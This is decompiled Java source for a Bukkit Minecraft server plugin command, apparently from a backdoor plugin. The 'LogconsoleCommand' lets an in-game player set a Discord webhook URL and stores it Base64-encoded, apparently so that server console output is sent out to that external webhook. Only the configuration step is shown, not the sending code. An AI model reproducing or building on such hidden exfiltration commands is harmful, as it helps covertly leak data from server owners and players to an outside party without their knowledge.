/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.util.Base64;
import org.bukkit.entity.Player;

public class LogconsoleCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("LogConsole < discord webhook URL>"));
        } else {
            byte[] wh2 = Base64.getEncoder().encode(args[1].getBytes());
            DataManager.getData().set("wh", (Object)new String(wh2));
            DataManager.saveData();
            p2.sendMessage(Settings.PREFIX("The webhook URL has been set"));
        }
    }
}

